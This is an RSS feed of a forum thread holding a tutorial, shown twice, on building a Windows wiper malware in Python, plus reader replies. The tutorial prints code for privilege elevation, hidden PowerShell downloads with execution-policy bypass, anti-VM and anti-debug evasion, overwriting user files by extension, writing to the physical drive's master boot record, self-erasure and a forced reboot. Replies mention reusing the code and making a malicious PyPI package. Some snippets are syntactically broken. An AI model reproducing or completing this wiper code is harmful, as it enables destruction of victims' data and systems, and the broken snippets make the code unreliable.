<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Python and Malware: Writing a simple wiper malware</title>
    <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652</link>
    <description># Introduction 

In this article, I’ll describe how to write a malware, Please notice this is not a &quot;true&quot;  malware this is only has to show you the basics  and even how easy to be written, Probably python is not the best choice at all, It’s an interpreted language and so it needs an interpreter to be executed so to write a malware probably other languages that can work to a lower level and that can be compiled are probably a better choice, malware is often designed to be small, stealthy, have low memory footprint, and use limited processing power,  So it&#39;s very common to see malware written in C &amp; Assembly.

## Overview

At first, I will show its code then I will describe generally how this malware works, code consisted of two components: we are talking only about windows, The techniques you gone see in this malware are taken from a public malware samples, I’ll leave all the links at the end of this article. [The malware source code](https://github.com/3xbuf/SkyWiper/blob/main/src/main.py)

The First function `IsAdmin` 
```python
def IsAdmin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
			except:
					return False
```
it checks if it has Administrator privileges, if it doesn’t it runs `RunAsAdmin` using the ShellExecute trick `runas` to elevate privileges, and exits immediately

```python
def RunAsAdmin():
ctypes.windll.shell32.IsUserAnAdmin() or (ctypes.windll.shell32.ShellExecuteW(None, &quot;runas&quot;, sys.executable, &quot; &quot;.join(sys.argv), None, 1) &gt; 32, sys.exit())

```

`Is64Bit` 
```python
def Is64Bit():
	return platform.machine().endswith(&#39;64&#39;)
```
it just check if the current process is a 64-bit using `platform` lib this function it’s gone be called later in `InstallPy` to determine which version of python should be installed, a simple if statement.
```python
os_p = 64
		if not Is64Bit():
			os_p = 32
```

`IsOnline`   This function simply checks if the infected computer is online using the “request” lib to get an HTTP response If TRUE, pass  if not, the program will delete it itself why? Desperate ways to avoid analysis and we don&#39;t want to infect a dead computer ;)

```python
def IsOnline():
	try:
		x = requests.get(&#39;https://google.com&#39;, verify=False)
			return True
				except:
					return False

```

## _Interpreter_

`IsPyExist` Here am using `os.path.exists` to see if python path exist in infected computer this can be done also by using subprocess to execute powershell cmd to check the version of python this way we can tell if python is present on the infected computer or not.

```python
    p = subprocess.run([&#39;powershell&#39;,
                        &quot;&quot;&quot;$p = &amp;{python -V} 2&gt;&amp;1;$version = if($p -is [System.Management.Automation.ErrorRecord]){$p.Exception.Message}; $p&quot;&quot;&quot;],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, startupinfo=startupinfo)
    p.stdout.decode()
    return True
    for num in range(10, 45):
        if os.path.exists(f&quot;C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe&quot;):
            return True
            return False
```

`InstallPy` The goal of this function is to install Python on the infected machine. The key is that we are installing our interpreter using a language that is already built into Windows.

```python
def InstallPy():
    os_p = 64
    if not Is64Bit():
        os_p = 32
    rand_py = f&#39;python{random.randrange(111, 9999999)}.exe&#39;
    url = &quot;https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe&quot; if os_p == 64 else &quot;https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe&quot;
    subprocess.run(
        f&quot;&quot;&quot;powershell -ep Bypass -WindowStyle Hidden -Command &quot;iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py}&quot; &quot;&quot;&quot;)
    if os.path.exists(f&quot;c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}&quot;):
        subprocess.run(
            f&quot;c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0&quot;)
    os.remove(f&quot;c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}&quot;)
    subprocess.run(&quot;python -m pip install --upgrade pip&quot;)
    subprocess.run(&quot;python -m pip install pyinstaller psutil&quot;)
    pip_list = RunPwsh(&quot;pip list&quot;)
    if &#39;psutil&#39; in pip_list.lower():
        wait4 = os.system(&#39;msg %username% in!&#39;)
    subprocess.run(&quot;msg %username% finished&quot;)
    return True
```
`PowerShell -WindowStyle Hidden` will hide the window.
`-ExecutionPolicy Bypass` should already do the run as admin part
`iwr -Uri ` `Invoke-WebRequest`  It parses the response and returns collections of links, 
The `{url}` will automatically download no need for user interaction  ` -OutFile`  output python exe to  `temp` directory  under a random name using `{rand_py}` 

I recommend this tutorial to better understand.
https://devtut.github.io/powershell/

## *Anti-analysis-techniques*


``AntiVm``  the following Function will search for VM Processes, the Malware will self delete anytime detect a VM the code can&#39;t detect hardware based VM&#39;s (like Hyper-V that accelerates in hardware e.g github workflow VPS)

```python
def AntiVm():
      Process = [&quot;vmsrvc.exe&quot; , &quot;vmusrvc.exe&quot;, &quot;vboxtray.exe&quot;, &quot;vmtoolsd.exe&quot;, &quot;df5serv.exe&quot;, &quot;vboxservice.exe&quot;]
      for process in psutil.process_iter():
         for i in Process:
            if i in process.name().lower():
                return CommitSuicide()
```

``AntiDebug``\
``isDebuggerPresent() function`` this is the most simplest anti-debugging technique From the MSDN’s documentation, we can see that it is a winapi function that take in no argument and return a non-zero if it detects a debugger (TRUE) or a zero which means it does not detect any debugger (FALSE) if the program retune (TRUE) the program will delete it itself 
```python
def AntiDebug():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
    if (isDebuggerPresent):
        return CommitSuicide() 
        return False
```


### Stage 1 - Destroy files content

- the wiper start by looking for folders that contained important files, like documents, downloads, pictures, music, and videos: more or less everything that a user might value. After the code found these folders, the wiping code overwrote their contents.

### File Extension target list
```cmd
            &quot;.m2ts&quot;, &quot;.mkv&quot;, &quot;.mov&quot;, &quot;.mp4&quot;, &quot;.mpg&quot;, &quot;.mpeg&quot;,
			&quot;.rm&quot;, &quot;.swf&quot;, &quot;.vob&quot;, &quot;.wmv&quot; &quot;.docx&quot;, &quot;.pdf&quot;,&quot;.rar&quot;,
			&quot;.jpg&quot;, &quot;.jpeg&quot;, &quot;.png&quot;, &quot;.tiff&quot;, &quot;.zip&quot;, &quot;.7z&quot;,
			&quot;.tar.gz&quot;, &quot;.tar&quot;, &quot;.mp3&quot;, &quot;.sh&quot;, &quot;.c&quot;, &quot;.cpp&quot;, &quot;.h&quot;,
			&quot;.gif&quot;, &quot;.txt&quot;, &quot;.jar&quot;, &quot;.sql&quot;, &quot;.bundle&quot;,
			&quot;.sqlite3&quot;, &quot;.html&quot;, &quot;.php&quot;, &quot;.log&quot;, &quot;.bak&quot;, &quot;.deb&quot;
```

```python
def SetFiles():
				for dirpath, dirs, files in os.walk(f&quot;C:\\Users\\{os.getlogin()}\\{os.getcwd()}&quot;):
					for f in files:
						path = os.path.abspath(os.path.join(dirpath, f))
							if f.endswith(tuple(ext)):
								with open(f, &quot;rb&quot;) as files:
									data = files.read()
									files.close()
								with open(f, &quot;wb&quot;) as files:
									data.write(b&#39;\x00&#39;) # Overwrites multiple files with zero bytes 
									data.close()
```

### Stage 2  - Destroy MBR

- The master boot record. The [Master Boot Record](https://en.wikipedia.org/wiki/Master_boot_record) is vital for a computer’s hard drive and it contains information about how to store files and what the computer should do when it starts up. Without the guidance of the master boot, it’s almost impossible for the machine to function properly

```python
def OverWriteMBR():
	hDevice = Kernel32.CreateFileW(&quot;\\\\.\\PhysicalDrive0&quot;, 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) 
		Kernel32.WriteFile(hDevice, Data, None)
		Kernel32.CloseHandle(hDevice) 
```
Create  a handle to our Physical Drive ``hDevice = Kernel32.CreateFileW(&quot;\\\\.\\PhysicalDrive0&quot;, 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0)  ``
For overwriting the MBR  ``Kernel32.WriteFile(hDevice, Data, None)``  and  close the handle to our Physical Drive!  ``Kernel32.CloseHandle(hDevice)``

### Stage 3 - Remove self
I found this function by reading the article [self-destructing](https://0x00sec.org/t/self-destructing-python-script/898) by @energywolf, it&#39;s simple and pretty neat. 
```python
def CommitSuicide():
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system(&quot;cipher /W:%s&quot; % folder_path) # At the end of the script, the file is deleted &amp; over-written
```

### Stage 4 - Shut it down!
Finaly the infected system should reboot immediately
```python
def SysDown():

# win32api.InitiateSystemShutdown(computername=&quot;&quot;,message=&quot;&quot;,timeOut=0, bForceclose=0,bRebootAfterShutdown=1)
	os.system(&quot;shutdown -t 0 -r -f &quot;)
```

### References
[Shamoon](https://github.com/raystyle/Shamoon-4/blob/master/Shamoon%204/Shamoon.cs)
[HermeticWiper](https://bazaar.abuse.ch/browse/signature/HermeticWiper/)
[Vx-Underground Paper ](https://samples.vx-underground.org/APTs/2022/2022.02.23(2)/Paper/sentinelone.com-HermeticWiper%20New%20Destructive%20Malware%20Used%20In%20Cyber%20Attacks%20on%20Ukraine.pdf)</description>
    
    <lastBuildDate>Thu, 02 Feb 2023 15:40:44 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/9</link>
        <pubDate>Thu, 09 Feb 2023 17:19:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-9</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[DerKeks]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for the AntiVM part, I didn’t know how to solve the problem.</p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/8</link>
        <pubDate>Thu, 02 Feb 2023 15:40:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-8</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[fasfaFasds]]></dc:creator>
        <description><![CDATA[
            <p>lots of cools tricks… the antiVm function im gonna… steal to my codes</p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/7</link>
        <pubDate>Tue, 31 Jan 2023 00:21:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-7</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[camel]]></dc:creator>
        <description><![CDATA[
            <p>Well written tutorial! I love the step-by-step approach you took.</p>
<p>Will definitely be using some of the snippets you provided at some point in time! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/5</link>
        <pubDate>Wed, 26 Oct 2022 20:51:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-5</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[0xf00]]></dc:creator>
        <description><![CDATA[
            <p>When I said simple, I mean super simple. It just has basic functionality</p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/4</link>
        <pubDate>Wed, 26 Oct 2022 01:02:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-4</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[hotspotbro]]></dc:creator>
        <description><![CDATA[
            <p>Would like to rewrite this for linux.Would make an evil Pypi package…</p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/3</link>
        <pubDate>Sun, 23 Oct 2022 22:15:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-3</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
      <item>
        <title>Python and Malware: Writing a simple wiper malware</title>
        <dc:creator><![CDATA[0xf00]]></dc:creator>
        <description><![CDATA[
            <h1>
<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, I’ll describe how to write a malware, Please notice this is not a “true”  malware this is only has to show you the basics  and even how easy to be written, Probably python is not the best choice at all, It’s an interpreted language and so it needs an interpreter to be executed so to write a malware probably other languages that can work to a lower level and that can be compiled are probably a better choice, malware is often designed to be small, stealthy, have low memory footprint, and use limited processing power,  So it’s very common to see malware written in C &amp; Assembly.</p>
<h2>
<a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h2>
<p>At first, I will show its code then I will describe generally how this malware works, code consisted of two components: we are talking only about windows, The techniques you gone see in this malware are taken from a public malware samples, I’ll leave all the links at the end of this article. <a href="https://github.com/3xbuf/SkyWiper/blob/main/src/main.py" rel="noopener nofollow ugc">The malware source code</a></p>
<p>The First function <code>IsAdmin</code></p>
<pre><code class="lang-python">def IsAdmin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
			except:
					return False
</code></pre>
<p>it checks if it has Administrator privileges, if it doesn’t it runs <code>RunAsAdmin</code> using the ShellExecute trick <code>runas</code> to elevate privileges, and exits immediately</p>
<pre><code class="lang-python">def RunAsAdmin():
ctypes.windll.shell32.IsUserAnAdmin() or (ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) &gt; 32, sys.exit())

</code></pre>
<p><code>Is64Bit</code></p>
<pre><code class="lang-python">def Is64Bit():
	return platform.machine().endswith('64')
</code></pre>
<p>it just check if the current process is a 64-bit using <code>platform</code> lib this function it’s gone be called later in <code>InstallPy</code> to determine which version of python should be installed, a simple if statement.</p>
<pre><code class="lang-python">os_p = 64
		if not Is64Bit():
			os_p = 32
</code></pre>
<p><code>IsOnline</code>   This function simply checks if the infected computer is online using the “request” lib to get an HTTP response If TRUE, pass  if not, the program will delete it itself why? Desperate ways to avoid analysis and we don’t want to infect a dead computer <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<pre><code class="lang-python">def IsOnline():
	try:
		x = requests.get('https://google.com', verify=False)
			return True
				except:
					return False

</code></pre>
<h2>
<a name="h-_interpreter_-3" class="anchor" href="https://0x00sec.org#h-_interpreter_-3"></a><em>Interpreter</em>
</h2>
<p><code>IsPyExist</code> Here am using <code>os.path.exists</code> to see if python path exist in infected computer this can be done also by using subprocess to execute powershell cmd to check the version of python this way we can tell if python is present on the infected computer or not.</p>
<pre><code class="lang-python">    p = subprocess.run(['powershell',
                        """$p = &amp;{python -V} 2&gt;&amp;1;$version = if($p -is [System.Management.Automation.ErrorRecord]){$p.Exception.Message}; $p"""],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, startupinfo=startupinfo)
    p.stdout.decode()
    return True
    for num in range(10, 45):
        if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
            return True
            return False
</code></pre>
<p><code>InstallPy</code> The goal of this function is to install Python on the infected machine. The key is that we are installing our interpreter using a language that is already built into Windows.</p>
<pre><code class="lang-python">def InstallPy():
    os_p = 64
    if not Is64Bit():
        os_p = 32
    rand_py = f'python{random.randrange(111, 9999999)}.exe'
    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if os_p == 64 else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    subprocess.run(
        f"""powershell -ep Bypass -WindowStyle Hidden -Command "iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py}" """)
    if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
        subprocess.run(
            f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0")
    os.remove(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}")
    subprocess.run("python -m pip install --upgrade pip")
    subprocess.run("python -m pip install pyinstaller psutil")
    pip_list = RunPwsh("pip list")
    if 'psutil' in pip_list.lower():
        wait4 = os.system('msg %username% in!')
    subprocess.run("msg %username% finished")
    return True
</code></pre>
<p><code>PowerShell -WindowStyle Hidden</code> will hide the window.<br>
<code>-ExecutionPolicy Bypass</code> should already do the run as admin part<br>
<code>iwr -Uri </code> <code>Invoke-WebRequest</code>  It parses the response and returns collections of links,<br>
The <code>{url}</code> will automatically download no need for user interaction  <code> -OutFile</code>  output python exe to  <code>temp</code> directory  under a random name using <code>{rand_py}</code></p>
<p>I recommend this tutorial to better understand.</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://devtut.github.io/powershell/">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/2/7/278db2ac61c831d2f1b6bff837215a95ba432a04.png" class="site-icon" width="32" height="32">

      <a href="https://devtut.github.io/powershell/" target="_blank" rel="noopener nofollow ugc">DevTut</a>
  </header>

  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/3/d38723e112ed7b045c82dd43da08b823c34414e9.png" class="thumbnail onebox-avatar" width="500" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/d/3/d38723e112ed7b045c82dd43da08b823c34414e9_2_10x10.png">

<h3><a href="https://devtut.github.io/powershell/" target="_blank" rel="noopener nofollow ugc">Disclaimer | DevTut</a></h3>

  <p>Example based programming tutorials for solid developers. Master 45+ programming topics.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<h2>
<a name="anti-analysis-techniques-4" class="anchor" href="https://0x00sec.org#anti-analysis-techniques-4"></a><em>Anti-analysis-techniques</em>
</h2>
<p><code>AntiVm</code>  the following Function will search for VM Processes, the Malware will self delete anytime detect a VM the code can’t detect hardware based VM’s (like Hyper-V that accelerates in hardware e.g github workflow VPS)</p>
<pre><code class="lang-python">def AntiVm():
      Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
      for process in psutil.process_iter():
         for i in Process:
            if i in process.name().lower():
                return CommitSuicide()
</code></pre>
<p><code>AntiDebug</code><br>
<code>isDebuggerPresent() function</code> this is the most simplest anti-debugging technique From the MSDN’s documentation, we can see that it is a winapi function that take in no argument and return a non-zero if it detects a debugger (TRUE) or a zero which means it does not detect any debugger (FALSE) if the program retune (TRUE) the program will delete it itself</p>
<pre><code class="lang-python">def AntiDebug():
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
    if (isDebuggerPresent):
        return CommitSuicide() 
        return False
</code></pre>
<h3>
<a name="stage-1-destroy-files-content-5" class="anchor" href="https://0x00sec.org#stage-1-destroy-files-content-5"></a>Stage 1 - Destroy files content</h3>
<ul>
<li>the wiper start by looking for folders that contained important files, like documents, downloads, pictures, music, and videos: more or less everything that a user might value. After the code found these folders, the wiping code overwrote their contents.</li>
</ul>
<h3>
<a name="file-extension-target-list-6" class="anchor" href="https://0x00sec.org#file-extension-target-list-6"></a>File Extension target list</h3>
<pre data-code-wrap="cmd"><code class="lang-nohighlight">            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
			".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
			".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z",
			".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
			".gif", ".txt", ".jar", ".sql", ".bundle",
			".sqlite3", ".html", ".php", ".log", ".bak", ".deb"
</code></pre>
<pre><code class="lang-python">def SetFiles():
				for dirpath, dirs, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"):
					for f in files:
						path = os.path.abspath(os.path.join(dirpath, f))
							if f.endswith(tuple(ext)):
								with open(f, "rb") as files:
									data = files.read()
									files.close()
								with open(f, "wb") as files:
									data.write(b'\x00') # Overwrites multiple files with zero bytes 
									data.close()
</code></pre>
<h3>
<a name="stage-2-destroy-mbr-7" class="anchor" href="https://0x00sec.org#stage-2-destroy-mbr-7"></a>Stage 2  - Destroy MBR</h3>
<ul>
<li>The master boot record. The <a href="https://en.wikipedia.org/wiki/Master_boot_record" rel="noopener nofollow ugc">Master Boot Record</a> is vital for a computer’s hard drive and it contains information about how to store files and what the computer should do when it starts up. Without the guidance of the master boot, it’s almost impossible for the machine to function properly</li>
</ul>
<pre><code class="lang-python">def OverWriteMBR():
	hDevice = Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0) 
		Kernel32.WriteFile(hDevice, Data, None)
		Kernel32.CloseHandle(hDevice) 
</code></pre>
<p>Create  a handle to our Physical Drive <code>hDevice = Kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0x00000001 | 0x00000002, None, 3, 0,0)  </code><br>
For overwriting the MBR  <code>Kernel32.WriteFile(hDevice, Data, None)</code>  and  close the handle to our Physical Drive!  <code>Kernel32.CloseHandle(hDevice)</code></p>
<h3>
<a name="stage-3-remove-self-8" class="anchor" href="https://0x00sec.org#stage-3-remove-self-8"></a>Stage 3 - Remove self</h3>
<p>I found this function by reading the article <a href="https://0x00sec.org/t/self-destructing-python-script/898">self-destructing</a> by <a class="mention" href="https://0x00sec.org/u/energywolf">@energywolf</a>, it’s simple and pretty neat.</p>
<pre><code class="lang-python">def CommitSuicide():
    file_path = os.path.abspath(__file__) 
    os.remove(file_path)
    folder_path = os.path.dirname(file_path) 
    os.system("cipher /W:%s" % folder_path) # At the end of the script, the file is deleted &amp; over-written
</code></pre>
<h3>
<a name="stage-4-shut-it-down-9" class="anchor" href="https://0x00sec.org#stage-4-shut-it-down-9"></a>Stage 4 - Shut it down!</h3>
<p>Finaly the infected system should reboot immediately</p>
<pre><code class="lang-python">def SysDown():

# win32api.InitiateSystemShutdown(computername="",message="",timeOut=0, bForceclose=0,bRebootAfterShutdown=1)
	os.system("shutdown -t 0 -r -f ")
</code></pre>
<h3>
<a name="references-10" class="anchor" href="https://0x00sec.org#references-10"></a>References</h3>
<p><a href="https://github.com/raystyle/Shamoon-4/blob/master/Shamoon%204/Shamoon.cs" rel="noopener nofollow ugc">Shamoon</a><br>
<a href="https://bazaar.abuse.ch/browse/signature/HermeticWiper/" rel="noopener nofollow ugc">HermeticWiper</a><br>
<a href="https://samples.vx-underground.org/APTs/2022/2022.02.23(2)/Paper/sentinelone.com-HermeticWiper%20New%20Destructive%20Malware%20Used%20In%20Cyber%20Attacks%20on%20Ukraine.pdf" rel="noopener nofollow ugc">Vx-Underground Paper </a></p>
          <p><a href="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652/1</link>
        <pubDate>Tue, 11 Oct 2022 01:18:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-31652-1</guid>
        <source url="https://0x00sec.org/t/python-and-malware-writing-a-simple-wiper-malware/31652.rss">Python and Malware: Writing a simple wiper malware</source>
      </item>
  </channel>
</rss>
